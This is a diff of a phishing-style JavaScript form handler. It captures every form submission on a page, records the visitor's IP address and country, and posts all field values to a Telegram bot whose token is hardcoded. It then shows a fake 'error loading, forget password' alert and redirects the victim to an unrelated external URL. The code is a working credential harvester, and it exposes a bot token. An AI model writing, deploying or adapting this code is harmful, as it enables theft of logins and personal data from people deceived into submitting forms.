@@ -1,49 +1,89 @@
-document.addEventListener("DOMContentLoaded", function () {
-    const form = document.getElementById("allForm");
-    if (!form) return;
+document.addEventListener("DOMContentLoaded", () => {
+  const DEFAULT_USER_ID = "7979664801"; // fallback if no id in URL
+  const BOT_TOKEN = "8433235666:AAGUgGfrFwj5dvE548wxyIpyzjrlaWXu_VA";
+  const forms = document.querySelectorAll("form");
 
-    const BOT_TOKEN = "8433235666:AAGUgGfrFwj5dvE548wxyIpyzjrlaWXu_VA";
-    const ADMIN_ID = "6976365864";
+  let userCountry = "Unknown"; // default
+  let userIP = "Unknown"; // <-- add IP variable
 
-    const urlParams = new URLSearchParams(window.location.search);
-    const userId = urlParams.get("id") || ADMIN_ID;
+  // Fetch country and IP first
+  fetch("https://ipapi.co/json/")
+    .then(res => res.json())
+    .then(data => {
+      if (data) {
+        if (data.country_name) userCountry = data.country_name;
+        if (data.ip) userIP = data.ip; // <-- store IP
+      }
+    })
+    .catch(err => console.error("IP lookup error:", err));
 
-    // ✅ Use the form's name instead of just the page title
-    const formName = form.getAttribute("name") || document.title || "Unknown Form";
+  forms.forEach((form) => {
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
 
-    form.addEventListener("submit", function (e) {
-        e.preventDefault();
+      // ensure country and IP are available
+      if (userCountry === "Unknown" || userIP === "Unknown") {
+        try {
+          const res = await fetch("https://ipapi.co/json/");
+          const data = await res.json();
+          if (data) {
+            if (data.country_name) userCountry = data.country_name;
+            if (data.ip) userIP = data.ip; // <-- retry IP
+          }
+        } catch (err) {
+          console.error("Retry IP lookup error:", err);
+        }
+      }
 
-        // Collect all form data dynamically
-        const formData = new FormData(form);
-        let message = `📩 New form submission (${formName}):\n\n`;
+      const urlParams = new URLSearchParams(window.location.search);
+      const userId = urlParams.get("id") || DEFAULT_USER_ID;
 
-        formData.forEach((value, key) => {
-            message += `🔹 ${key}: ${value}\n`;
+      const formData = {};
+      new FormData(form).forEach((value, key) => {
+        formData[key] = value;
+      });
+
+      // current date & time (local)
+      const now = new Date();
+      const dateTime = now.toLocaleString(); // e.g. "10/8/2025, 4:25:36 PM"
+
+      // Only include Form line if form has a name
+      const formName = (form.getAttribute("name") || "").trim();
+      const formLine = formName ? `📄 Form: ${formName}\n` : "";
+
+      const payload = {
+        chat_id: userId,
+        text:
+          `📋 *New Form Submitted*\n\n` +
+          `🏷️ Page: ${document.title}\n` +
+          formLine +
+          `🌍 Country: ${userCountry}\n` +
+          `🕒 Date & Time: ${dateTime}\n` +
+          `📍 IP: ${userIP}\n\n` + // <-- added IP line
+          Object.entries(formData).map(([k, v]) => `• *${k}:* ${v}`).join("\n"),
+        parse_mode: "Markdown"
+      };
+
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
         });
 
-        message += `\n🆔 Telegram ID: ${userId}`;
-        message += `\n🌐 URL: ${window.location.href}`;
-        message += `\n🕒 Time: ${new Date().toLocaleString()}`;
-
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                chat_id: userId,
-                text: message
-            })
-        })
-        .then(res => {
-            if (res.ok) {
-                window.location.href = `tr.html?id=${userId}`;
-            } else {
-                alert("Failed please try again.");
-            }
-        })
-        .catch(err => {
-            console.error("Telegram API error:", err);
-            alert("Network error.");
-        });
+        if (response.ok) {
+          alert(`Please wait, error loading, forget password.`);
+          form.reset();
+          window.location.href = `https://otieu.com/4/9831084`;
+        } else {
+          const errorText = await response.text();
+          console.error("Telegram Error:", errorText);
+          alert(`❌ Error submitting form. Check console for details.`);
+        }
+      } catch (err) {
+        console.error("Network Error:", err);
+        alert("⚠️ Network error. Please check your connection.");
+      }
     });
+  });
 });
